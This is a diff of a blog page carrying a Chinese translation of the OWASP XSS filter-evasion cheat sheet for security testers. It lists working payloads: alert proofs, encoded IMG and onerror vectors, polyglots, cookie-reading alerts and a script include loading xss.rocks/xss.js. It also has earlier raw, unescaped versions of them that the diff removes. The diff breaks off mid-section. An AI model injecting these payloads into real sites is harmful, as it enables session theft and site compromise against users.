@@ -87,41 +87,10 @@
 <meta property="og:site_name" content="想念初恋">
 <meta property="og:description" content="1.介绍这篇文章的主要目的是给专业安全测试人员提供一份跨站脚本漏洞检测指南。文章的初始内容是由RSnake提供给 OWASP，内容基于他的XSS备忘录:http://ha.ckers.org/xss.html。目前这个网页已经重定向到OWASP网站，将由OWASP维护和完善它。OWASP 的第一个防御备忘录项目：XSS (Cross Site Scripting)Prevention Cheat">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/x">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”%3Chttp://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”javascript:alert(‘XSS’);”">
-<meta property="og:image" content="javascript:alert(‘XSS’)">
-<meta property="og:image" content="JaVaScRiPt:alert(‘XSS’)">
-<meta property="og:image" content="javascript:alert("XSS")">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/%60javascript:alert(“RSnake">
-<meta property="og:image" content="javascript:alert(String.fromCharCode(88,83,83))">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/index.html#">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/onmouseover=”alert(‘xxs’)”">
-<meta property="og:image" content="http://nickzhoulin.github.io/">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/x">
-<meta property="og:image" content="javascript:alert(">
-<meta property="og:image" content="javascript:a&">
-<meta property="og:image" content="javascript:alert('XSS')">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”jav">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”jav%09ascript:alert(‘XSS’);”">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”jav%0Aascript:alert(‘XSS’);”">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”jav%0Dascript:alert(‘XSS’);”">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/java/0script:alert(/”XSS/”)">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/”">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/’vbscript:msgbox(“XSS”)’">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/javas%3C!--%20--%3Ecript:alert(%27XSS%27)">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/%3Chttp://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode%3E">
-<meta property="og:image" content="httx://badguy.com/a.jpg">
-<meta property="og:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/x">
-<meta property="og:image" content="x:x">
-<meta property="og:image" content="x:alert(alt)">
-<meta property="og:image" content="x:gif">
-<meta property="og:image" content="worksinchrome:prompt(1)">
-<meta property="og:updated_time" content="2017-11-14T09:06:19.947Z">
+<meta property="og:updated_time" content="2017-11-14T09:10:49.817Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS过滤绕过速查表">
 <meta name="twitter:description" content="1.介绍这篇文章的主要目的是给专业安全测试人员提供一份跨站脚本漏洞检测指南。文章的初始内容是由RSnake提供给 OWASP，内容基于他的XSS备忘录:http://ha.ckers.org/xss.html。目前这个网页已经重定向到OWASP网站，将由OWASP维护和完善它。OWASP 的第一个防御备忘录项目：XSS (Cross Site Scripting)Prevention Cheat">
-<meta name="twitter:image" content="http://nickzhoulin.github.io/2017/11/13/page171113/x">
 
 
 
@@ -388,235 +357,94 @@
 <h2 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h2><p>这份备忘录是为那些已经理解XSS攻击，但是想要了解关于绕过过滤器方法之间细微差别的人准备的。</p>
 <p>请注意大部分的跨站脚本攻击向量已经在其代码下方给出的浏览器列表中进行测试。</p>
 <h3 id="2-1-XSS定位器"><a href="#2-1-XSS定位器" class="headerlink" title="2.1.  XSS定位器"></a>2.1.  XSS定位器</h3><p>在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞：</p>
-<blockquote>
-<p>‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;</p>
-<p>alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–</p>
-<p>>”&gt;’&gt;<script>alert(String.fromCharCode(88,83,83))</script></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;</div><div class="line"></div><div class="line">alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–</div><div class="line"></div><div class="line">&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-2-XSS定位器（短）"><a href="#2-2-XSS定位器（短）" class="headerlink" title="2.2.  XSS定位器（短）"></a>2.2.  XSS定位器（短）</h3><p>如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在<strong>&lt;XSS </strong>或<strong>&lt;XSS</strong>字样来确认是否存在漏洞</p>
-<blockquote>
-<p>”;!–”<xss>=&amp;{()}</xss></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">”;!–”&lt;XSS&gt;=&amp;&#123;()&#125;</div></pre></td></tr></table></figure>
 <h3 id="2-3-无过滤绕过"><a href="#2-3-无过滤绕过" class="headerlink" title="2.3.  无过滤绕过"></a>2.3.  无过滤绕过</h3><p>这是一个常规的XSS注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：</p>
-<blockquote>
-<script src="<http://xss.rocks/xss.js">&gt;</script>
-
-</blockquote>
-<h3 id="2-4-利用多语言进行过滤绕过"><a href="#2-4-利用多语言进行过滤绕过" class="headerlink" title="2.4.  利用多语言进行过滤绕过"></a>2.4.  利用多语言进行过滤绕过</h3><blockquote>
-<p>‘”&gt;&gt;<marquee><img src="x" onerror="confirm(1)"></marquee>”&gt;&lt;/|><plaintext onmouseover="prompt(1)"></plaintext></p>
-<script>prompt(1)</script>@gmail.com<isindex formaction="javascript:alert(/XSS/)" type="submit">’–>”>
-
-<p><script>alert(document.cookie)</script>”&gt;</p>
-<p><img id="”confirm&lpar;1)”/alt=”/”src=”/”onerror=eval(id)">’”&gt;</p>
-<p><img src="”<http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">“&gt;</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=&lt;http://xss.rocks/xss.js&gt;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-4-利用多语言进行过滤绕过"><a href="#2-4-利用多语言进行过滤绕过" class="headerlink" title="2.4.  利用多语言进行过滤绕过"></a>2.4.  利用多语言进行过滤绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">‘”&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;”&gt;&lt;/plaintext\&gt;&lt;/|&gt;&lt;plaintext/onmouseover=prompt(1)&gt;</div><div class="line"></div><div class="line">&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’–&gt;”&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;”&gt;</div><div class="line"></div><div class="line">&lt;img/id=”confirm&amp;lpar;1)”/alt=”/”src=”/”onerror=eval(id)&gt;’”&gt;</div><div class="line"></div><div class="line">&lt;img src=”&lt;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&gt;“&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-5-通过JavaScript命令实现的图片XSS"><a href="#2-5-通过JavaScript命令实现的图片XSS" class="headerlink" title="2.5.  通过JavaScript命令实现的图片XSS"></a>2.5.  通过JavaScript命令实现的图片XSS</h3><p>图片注入使用JavaScript命令实现（IE7.0 不支持在图片上下文中使用JavaScript 命令，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）：</p>
-<blockquote>
-<img src="”javascript:alert(‘XSS’);”">
-
-</blockquote>
-<h3 id="2-6-无分号无引号"><a href="#2-6-无分号无引号" class="headerlink" title="2.6.  无分号无引号"></a>2.6.  无分号无引号</h3><blockquote>
-<img src="javascript:alert(‘XSS’)">
-
-</blockquote>
-<h3 id="2-7-不区分大小写的XSS攻击向量"><a href="#2-7-不区分大小写的XSS攻击向量" class="headerlink" title="2.7.  不区分大小写的XSS攻击向量"></a>2.7.  不区分大小写的XSS攻击向量</h3><blockquote>
-<img src="JaVaScRiPt:alert(‘XSS’)">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-6-无分号无引号"><a href="#2-6-无分号无引号" class="headerlink" title="2.6.  无分号无引号"></a>2.6.  无分号无引号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-7-不区分大小写的XSS攻击向量"><a href="#2-7-不区分大小写的XSS攻击向量" class="headerlink" title="2.7.  不区分大小写的XSS攻击向量"></a>2.7.  不区分大小写的XSS攻击向量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-8-HTML实体"><a href="#2-8-HTML实体" class="headerlink" title="2.8.  HTML实体"></a>2.8.  HTML实体</h3><p>必须有分号才可生效</p>
-<blockquote>
-<img src="javascript:alert(&quot;XSS&quot;)">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-9-重音符混淆"><a href="#2-9-重音符混淆" class="headerlink" title="2.9.  重音符混淆"></a>2.9.  重音符混淆</h3><p>如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符：</p>
-<blockquote>
-<img src="`javascript:alert(“RSnake" says,="" ‘xss’”)`="">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(“RSnake says, ‘XSS’”)`&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-10-畸形的A标签"><a href="#2-10-畸形的A标签" class="headerlink" title="2.10.    畸形的A标签"></a>2.10.    畸形的A标签</h3><p>跳过HREF标签找到XSS的重点。。。由DavidCross提交~已在Chrome上验证</p>
-<blockquote>
-<p><a onmouseover="”alert(document.cookie)”">xxs link</a></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=”alert(document.cookie)”&gt;xss link&lt;/a&gt;</div></pre></td></tr></table></figure>
 <p>此外Chrome经常帮你补全确实的引号。。。如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号。</p>
-<blockquote>
-<p><a onmouseover="alert(document.cookie)">xxs link</a></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=alert(document.cookie)&gt;xss link&lt;/a&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-11-畸形的IMG标签"><a href="#2-11-畸形的IMG标签" class="headerlink" title="2.11.    畸形的IMG标签"></a>2.11.    畸形的IMG标签</h3><p>最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签：</p>
-<blockquote>
-<p>&lt;IMG “””&gt;<script>alert(“XSS”)</script>”&gt;</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-12-fromCharCode函数"><a href="#2-12-fromCharCode函数" class="headerlink" title="2.12.    fromCharCode函数"></a>2.12.    fromCharCode函数</h3><p>如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量：</p>
-<blockquote>
-<img src="javascript:alert(String.fromCharCode(88,83,83))">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-13-使用默认SRC属性绕过SRC域名过滤器"><a href="#2-13-使用默认SRC属性绕过SRC域名过滤器" class="headerlink" title="2.13.    使用默认SRC属性绕过SRC域名过滤器"></a>2.13.    使用默认SRC属性绕过SRC域名过滤器</h3><p>这种方法可以绕过大多数SRC域名过滤器。将JavaScript代码插入事件方法同样适用于注入使用elements的任何HTML标签，例如Form,Iframe, Input, Embed等等。它同样允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick。下面会给出许多不同的可注入事件列表。由David Cross提交，Abdullah Hussam(@Abdulahhusam)编辑。</p>
-<blockquote>
-<img src="#" onmouseover="”alert(‘xxs’)”">
-
-</blockquote>
-<h3 id="2-14-使用默认为空的SRC属性"><a href="#2-14-使用默认为空的SRC属性" class="headerlink" title="2.14.    使用默认为空的SRC属性"></a>2.14.    使用默认为空的SRC属性</h3><blockquote>
-<img src="onmouseover=”alert(‘xxs’)”">
-
-</blockquote>
-<h3 id="2-15-使用不含SRC属性"><a href="#2-15-使用不含SRC属性" class="headerlink" title="2.15.    使用不含SRC属性"></a>2.15.    使用不含SRC属性</h3><blockquote>
-<img onmouseover="”alert(‘xxs’)”">
-
-</blockquote>
-<h3 id="2-16-通过error事件触发alert"><a href="#2-16-通过error事件触发alert" class="headerlink" title="2.16.    通过error事件触发alert"></a>2.16.    通过error事件触发alert</h3><blockquote>
-<p><img src="/" onerror="”alert(String.fromCharCode(88,83,83))”"></p>
-</blockquote>
-<h3 id="2-17-对IMG标签中onerror属性进行编码"><a href="#2-17-对IMG标签中onerror属性进行编码" class="headerlink" title="2.17.    对IMG标签中onerror属性进行编码"></a>2.17.    对IMG标签中onerror属性进行编码</h3><blockquote>
-<p><img src="x" onerror="”&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041″"></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-14-使用默认为空的SRC属性"><a href="#2-14-使用默认为空的SRC属性" class="headerlink" title="2.14.    使用默认为空的SRC属性"></a>2.14.    使用默认为空的SRC属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC= onmouseover=”alert(‘xxs’)”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-15-使用不含SRC属性"><a href="#2-15-使用不含SRC属性" class="headerlink" title="2.15.    使用不含SRC属性"></a>2.15.    使用不含SRC属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG onmouseover=”alert(‘xxs’)”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-16-通过error事件触发alert"><a href="#2-16-通过error事件触发alert" class="headerlink" title="2.16.    通过error事件触发alert"></a>2.16.    通过error事件触发alert</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;&lt;/img&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-17-对IMG标签中onerror属性进行编码"><a href="#2-17-对IMG标签中onerror属性进行编码" class="headerlink" title="2.17.    对IMG标签中onerror属性进行编码"></a>2.17.    对IMG标签中onerror属性进行编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=x onerror=”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-18-十进制HTML字符实体编码"><a href="#2-18-十进制HTML字符实体编码" class="headerlink" title="2.18.    十进制HTML字符实体编码"></a>2.18.    十进制HTML字符实体编码</h3><p>所有在IMG标签里直接使用javascript:形式的XSS示例无法在Firefox或Netscape8.1以上浏览器（使用Gecko渲染引擎）运行。</p>
-<blockquote>
-<img src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;" &#39;&#88;&#83;&#83;&#39;&#41;="">
-
-</blockquote>
-<h3 id="2-19-不带分号的十进制HTML字符实体编码"><a href="#2-19-不带分号的十进制HTML字符实体编码" class="headerlink" title="2.19.    不带分号的十进制HTML字符实体编码"></a>2.19.    不带分号的十进制HTML字符实体编码</h3><p>这对于绕过对“&#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如$tmp_string =~s/.<em>\&amp;#(\d+);.</em>/$1/;形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的）：</p>
-<blockquote>
-<img src="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&" \#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041="">
-
-</blockquote>
-<h3 id="2-20-不带分号的十六进制HTML字符实体编码"><a href="#2-20-不带分号的十六进制HTML字符实体编码" class="headerlink" title="2.20.    不带分号的十六进制HTML字符实体编码"></a>2.20.    不带分号的十六进制HTML字符实体编码</h3><p>这是有效绕过例如$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/;过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此）</p>
-<blockquote>
-<img src="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</div><div class="line"></div><div class="line">&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-19-不带分号的十进制HTML字符实体编码"><a href="#2-19-不带分号的十进制HTML字符实体编码" class="headerlink" title="2.19.    不带分号的十进制HTML字符实体编码"></a>2.19.    不带分号的十进制HTML字符实体编码</h3><p>这对于绕过对“&#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tmp_string =~s/.*\&amp;#(\d+);.*/1/</div></pre></td></tr></table></figure>
+<p>形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;</div><div class="line"></div><div class="line">#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-20-不带分号的十六进制HTML字符实体编码"><a href="#2-20-不带分号的十六进制HTML字符实体编码" class="headerlink" title="2.20.    不带分号的十六进制HTML字符实体编码"></a>2.20.    不带分号的十六进制HTML字符实体编码</h3><p>这是有效绕过例如<code>$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code>过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-21-内嵌TAB"><a href="#2-21-内嵌TAB" class="headerlink" title="2.21.    内嵌TAB"></a>2.21.    内嵌TAB</h3><p>使用TAB来分开XSS攻击代码：</p>
-<blockquote>
-<img src="”jav" ascript:alert(‘xss’);”="">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-22-内嵌编码后TAB"><a href="#2-22-内嵌编码后TAB" class="headerlink" title="2.22.    内嵌编码后TAB"></a>2.22.    内嵌编码后TAB</h3><p>使用编码后的TAB来分开XSS攻击代码：</p>
-<blockquote>
-<img src="”jav&#x09;ascript:alert(‘XSS’);”">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”jav&amp;#x09;ascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-23-内嵌换行分隔XSS攻击代码"><a href="#2-23-内嵌换行分隔XSS攻击代码" class="headerlink" title="2.23.    内嵌换行分隔XSS攻击代码"></a>2.23.    内嵌换行分隔XSS攻击代码</h3><p>一些网站声称09到13（十进制）的HTML实体字符都可以实现这种攻击，这是不正确的。只有09（TAB），10（换行）和13（回车）有效。查看ASCII字符表获取更多细节。下面几个XSS示例介绍了这些向量。</p>
-<blockquote>
-<img src="”jav&#x0A;ascript:alert(‘XSS’);”">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”jav&amp;#x0A;ascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-24-内嵌回车分隔XSS攻击代码"><a href="#2-24-内嵌回车分隔XSS攻击代码" class="headerlink" title="2.24.    内嵌回车分隔XSS攻击代码"></a>2.24.    内嵌回车分隔XSS攻击代码</h3><p>注意：上面使用了比实际需要长的字符串是因为0可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有2到3位字符。实际规则是1至7位字符：</p>
-<blockquote>
-<img src="”jav&#x0D;ascript:alert(‘XSS’);”">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”jav&amp;#x0D;ascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-25-使用空字符分隔JavaScript指令"><a href="#2-25-使用空字符分隔JavaScript指令" class="headerlink" title="2.25.    使用空字符分隔JavaScript指令"></a>2.25.    使用空字符分隔JavaScript指令</h3><p>空字符同样可以作为XSS攻击向量，但和上面有所区别，你需要使用一些例如Burp工具或在URL字符串里使用%00，亦或你想使用VIM编写自己的注入工具（^V^@会生成空字符），还可以通过程序生成它到一个文本文件。老版本的Opera浏览器（例如Windows版的7.11）还会受另一个字符173（软连字符）的影响。但是空字符%00更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：</p>
-<blockquote>
-<p>perl -e ‘print “<img src="java\0script:alert(\”XSS\”)">”;’ &gt; out</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</div></pre></td></tr></table></figure>
 <h3 id="2-26-利用IMG标签中JavaScript指令前的空格和元字符"><a href="#2-26-利用IMG标签中JavaScript指令前的空格和元字符" class="headerlink" title="2.26.    利用IMG标签中JavaScript指令前的空格和元字符"></a>2.26.    利用IMG标签中JavaScript指令前的空格和元字符</h3><p>如果过滤器不计算”javascript:”前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和”javascript:”字样间不能有任何字符。实际情况是你可以插入任何十进制的1至32号字符：</p>
-<blockquote>
-<img src="”" &#14;="" javascript:alert(‘xss’);”="">
-
-</blockquote>
-<h3 id="2-27-利用非字母非数字字符"><a href="#2-27-利用非字母非数字字符" class="headerlink" title="2.27.    利用非字母非数字字符"></a>2.27.    利用非字母非数字字符</h3><p>FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:</p>
-<blockquote>
-<script xss="" src="”<http://xss.rocks/xss.js">“&gt;</script>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=” &amp;#14;  javascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-27-利用非字母非数字字符"><a href="#2-27-利用非字母非数字字符" class="headerlink" title="2.27.    利用非字母非数字字符"></a>2.27.    利用非字母非数字字符</h3><p>FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/XSS SRC=”&lt;http://xss.rocks/xss.js&gt;“&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <p>基于上面的原理，可以使用模糊测试进行扩展。Gecko渲染引擎允许任何字符包括字母，数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:</p>
-<blockquote>
-<body onload!#$%&()*~+-_.,:;?@[="" |\]^`="alert(“XSS”)">
-
-</body></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</div></pre></td></tr></table></figure>
 <p>Yair Amit让我注意到了IE和Gecko渲染引擎有一点不同行为，在于是否在HTML标签和参数之间允许一个不含空格的斜杠。这会非常有用如果系统不允许空格的时候。</p>
-<blockquote>
